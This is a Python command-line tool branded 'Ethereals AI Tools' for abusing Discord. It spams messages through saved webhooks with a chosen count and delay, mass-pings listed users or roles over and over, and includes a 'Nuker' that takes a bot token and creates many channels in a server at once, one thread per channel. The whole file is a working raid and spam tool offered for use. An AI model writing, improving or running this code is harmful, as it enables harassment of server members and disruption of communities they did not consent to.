import requests
import time
import os
import sys
from colorama import init, Fore, Back, Style, AnsiToWin32
import json
import re
from threading import Event
import threading

init(wrap=False)
if os.name == 'nt':
    sys.stdout = AnsiToWin32(sys.stdout).stream

stop_event = Event()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
               ███████╗████████╗██╗  ██╗███████╗██████╗ ███████╗ █████╗ ██╗     
               ██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██║     
               █████╗     ██║   ███████║█████╗  ██████╔╝█████╗  ███████║██║     
               ██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║     
               ██████╗    ██║   ██║  ██║███████╗██║  ██║███████╗██║  ██║███████╗
               ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
"""
    print(Fore.RED + banner + Style.RESET_ALL)
    print(Fore.RED + '='*75 + Style.RESET_ALL)
    print(Fore.RED + "                        Ethereals AI Tools" + Style.RESET_ALL)
    print(Fore.RED + '='*75 + "\n" + Style.RESET_ALL)

def validate_webhook(webhook_url):
    pattern = r'^https://discord\.com/api/webhooks/\d+/[\w-]+$'
    return bool(re.match(pattern, webhook_url))

def save_webhook(name, url):
    try:
        webhooks = {}
        if os.path.exists('webhooks.json'):
            with open('webhooks.json', 'r') as f:
                webhooks = json.load(f)
        
        webhooks[name] = url
        
        with open('webhooks.json', 'w') as f:
            json.dump(webhooks, f, indent=4)
        return True
    except Exception as e:
        print(Fore.RED + f"Error saving webhook: {str(e)}" + Style.RESET_ALL)
        return False

def load_webhooks():
    try:
        if os.path.exists('webhooks.json'):
            with open('webhooks.json', 'r') as f:
                return json.load(f)
    except Exception as e:
        print(Fore.RED + f"Error loading webhooks: {str(e)}" + Style.RESET_ALL)
    return {}

def delete_webhook(name):
    try:
        if os.path.exists('webhooks.json'):
            webhooks = load_webhooks()
            if name in webhooks:
                del webhooks[name]
                with open('webhooks.json', 'w') as f:
                    json.dump(webhooks, f, indent=4)
                return True
    except Exception as e:
        print(Fore.RED + f"Error deleting webhook: {str(e)}" + Style.RESET_ALL)
    return False

def show_webhooks():
    webhooks = load_webhooks()
    if webhooks:
        print(f"\n{Fore.RED}Available Webhooks:" + Style.RESET_ALL)
        print(Fore.RED + '='*30 + Style.RESET_ALL)
        for name, url in webhooks.items():
            print(f"{Fore.RED}► {Fore.RED}{name}: {Style.DIM}{url}{Style.RESET_ALL}")
        print(Fore.RED + '='*30 + "\n" + Style.RESET_ALL)
    return webhooks

def get_valid_input(prompt, valid_options=None):
    while True:
        try:
            user_input = input(prompt + Style.RESET_ALL).strip()
            if user_input.lower() == 'z':
                return 'z'
            if valid_options is None or user_input in valid_options:
                return user_input
            else:
                print(Fore.RED + "Invalid input. Please try again." + Style.RESET_ALL)
                time.sleep(1)
        except Exception as e:
            print(Fore.RED + "Invalid input. Please try again." + Style.RESET_ALL)
            time.sleep(1)

def mass_ping():
    clear_screen()
    print_banner()
    print(Fore.RED + "Mass Ping - Enter Z to return to the main menu." + Style.RESET_ALL)

    webhooks = show_webhooks()
    
    webhook_input = get_valid_input(f"{Fore.RED}Enter webhook URL or saved name for mass ping: {Fore.RED}")
    if webhook_input == 'z':
        return

    webhook_url = webhooks.get(webhook_input, webhook_input)

    if not validate_webhook(webhook_url):
        print(Fore.RED + "Invalid webhook URL!" + Style.RESET_ALL)
        time.sleep(2)
        return

    # Collecting ping targets
    print(Fore.RED + "Enter usernames or roles to mass ping (separate with commas): " + Style.RESET_ALL)
    ping_targets = get_valid_input(f"{Fore.RED}Enter targets (e.g., @username1, @username2): {Fore.RED}")
    if ping_targets == 'z':
        return

    # Create a ping message
    ping_message = ' '.join([f"@{target.strip()}" for target in ping_targets.split(',')])
    
    print(Fore.RED + f"Mass pinging: {ping_message}" + Style.RESET_ALL)
    
    while True:
        try:
            num_messages = int(get_valid_input(f"{Fore.RED}Enter number of pings to send: {Fore.RED}"))
            delay = float(get_valid_input(f"{Fore.RED}Enter delay between pings (in seconds): {Fore.RED}"))
            break
        except ValueError:
            print(Fore.RED + "Invalid number. Please try again." + Style.RESET_ALL)

    success, fail = send_webhook_message(webhook_url, ping_message, num_messages, delay)
    
    print(f"\n{Fore.GREEN}Successfully sent {success} pings!" + Style.RESET_ALL)
    print(f"{Fore.RED}Failed to send {fail} pings!" + Style.RESET_ALL)
    
    input(f"\n{Fore.RED}Press Enter to return to the main menu...")

def send_webhook_message(webhook_url, message, num_messages, delay):
    success = 0
    fail = 0
    for _ in range(num_messages):
        try:
            response = requests.post(webhook_url, json={'content': message})
            if response.status_code == 204:
                success += 1
            else:
                fail += 1
        except Exception as e:
            print(Fore.RED + f"Error sending message: {str(e)}" + Style.RESET_ALL)
            fail += 1
        time.sleep(delay)
    return success, fail

def nuke_tool():
    clear_screen()
    print_banner()
    print(Fore.RED + "Nuker - Create Channels" + Style.RESET_ALL)
    print(Fore.RED + "Enter Z to return to the main menu." + Style.RESET_ALL)

    bot_token = get_valid_input(f"{Fore.RED}Enter your bot token: {Fore.RED}")
    if bot_token.lower() == 'z':
        return

    guild_id = get_valid_input(f"{Fore.RED}Enter your guild ID: {Fore.RED}")
    if guild_id.lower() == 'z':
        return

    num_channels = int(get_valid_input(f"{Fore.RED}Enter number of channels to create: {Fore.RED}"))
    channel_name = get_valid_input(f"{Fore.RED}Enter base name for channels: {Fore.RED}")

    print(Fore.RED + f"Creating {num_channels} channels in guild ID: {guild_id} with bot token: {bot_token}" + Style.RESET_ALL)

    def create_channel(i):
        channel_payload = {
            'name': f"{channel_name}-{i+1}",
            'type': 0  # 0 for text channels
        }
        response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', json=channel_payload, headers={'Authorization': f'Bot {bot_token}'})
        if response.status_code == 201:
            print(Fore.GREEN + f"Channel created: {channel_name}-{i+1}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Failed to create channel: {channel_name}-{i+1} - {response.status_code} - {response.text}" + Style.RESET_ALL)

    threads = []
    for i in range(num_channels):
        thread = threading.Thread(target=create_channel, args=(i,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    input(f"\n{Fore.RED}Press Enter to return to the main menu...")

def main():
    while True:
        try:
            clear_screen()
            print_banner()
            stop_event.clear()
            print(Fore.RED + "Options:" + Style.RESET_ALL)
            print(Fore.RED + '='*30 + Style.RESET_ALL)
            print(f"{Fore.RED}[1] {Fore.RED}Send Messages (Webhook){Style.RESET_ALL}")
            print(f"{Fore.RED}[2] {Fore.RED}Save New Webhook{Style.RESET_ALL}")
            print(f"{Fore.RED}[3] {Fore.RED}Delete Saved Webhook{Style.RESET_ALL}")
            print(f"{Fore.RED}[4] {Fore.RED}Nuker{Style.RESET_ALL}")
            print(f"{Fore.RED}[5] {Fore.RED}Mass Ping{Style.RESET_ALL}")
            print(f"{Fore.RED}[6] {Fore.RED}Exit{Style.RESET_ALL}")
            print(Fore.RED + '='*30 + "\n" + Style.RESET_ALL)
            
            choice = get_valid_input(f"\n{Fore.RED}={Fore.RED} ", ['1', '2', '3', '4', '5', '6', 'z', '!'])
            
            if choice == 'z':
                continue
            
            if choice == '!':
                continue
            
            if choice == '1':
                clear_screen()
                print_banner()
                print(Fore.RED + "Enter Z to return to the main menu." + Style.RESET_ALL)
                
                webhooks = show_webhooks()
                
                webhook_input = get_valid_input(f"{Fore.RED}Enter webhook URL or saved name: {Fore.RED}")
                if webhook_input == 'z':
                    continue
                
                webhook_url = webhooks.get(webhook_input, webhook_input)
                
                if not validate_webhook(webhook_url):
                    print(Fore.RED + "Invalid webhook URL!" + Style.RESET_ALL)
                    time.sleep(2)
                    continue
                
                message = get_valid_input(f"{Fore.RED}Enter message to send: {Fore.RED}")
                if message == 'z':
                    continue
                
                while True:
                    try:
                        num_messages = int(get_valid_input(f"{Fore.RED}Enter number of messages to send: {Fore.RED}"))
                        delay = float(get_valid_input(f"{Fore.RED}Enter delay between messages (in seconds): {Fore.RED}"))
                        break
                    except ValueError:
                        print(Fore.RED + "Invalid number. Please try again." + Style.RESET_ALL)

                success, fail = send_webhook_message(webhook_url, message, num_messages, delay)
                print(f"\n{Fore.GREEN}Successfully sent {success} messages!" + Style.RESET_ALL)
                print(f"{Fore.RED}Failed to send {fail} messages!" + Style.RESET_ALL)
                
                input(f"\n{Fore.RED}Press Enter to return to the main menu...")

            elif choice == '2':
                clear_screen()
                print_banner()
                print(Fore.RED + "Enter Z to return to the main menu." + Style.RESET_ALL)
                
                name = get_valid_input(f"{Fore.RED}Enter a name for the webhook: {Fore.RED}")
                if name == 'z':
                    continue
                
                url = get_valid_input(f"{Fore.RED}Enter the webhook URL: {Fore.RED}")
                if url == 'z':
                    continue
                
                if save_webhook(name, url):
                    print(Fore.GREEN + "Webhook saved successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Failed to save webhook!" + Style.RESET_ALL)
                
                input(f"\n{Fore.RED}Press Enter to return to the main menu...")
            
            elif choice == '3':
                clear_screen()
                print_banner()
                print(Fore.RED + "Enter Z to return to the main menu." + Style.RESET_ALL)
                
                name = get_valid_input(f"{Fore.RED}Enter the name of the webhook to delete: {Fore.RED}")
                if name == 'z':
                    continue
                
                if delete_webhook(name):
                    print(Fore.GREEN + "Webhook deleted successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Failed to delete webhook!" + Style.RESET_ALL)
                
                input(f"\n{Fore.RED}Press Enter to return to the main menu...")
            
            elif choice == '4':
                nuke_tool()
            
            elif choice == '5':
                mass_ping()

            elif choice == '6':
                print(Fore.RED + "Exiting..." + Style.RESET_ALL)
                break

        except Exception as e:
            print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)
            time.sleep(2)

if __name__ == "__main__":
    main()
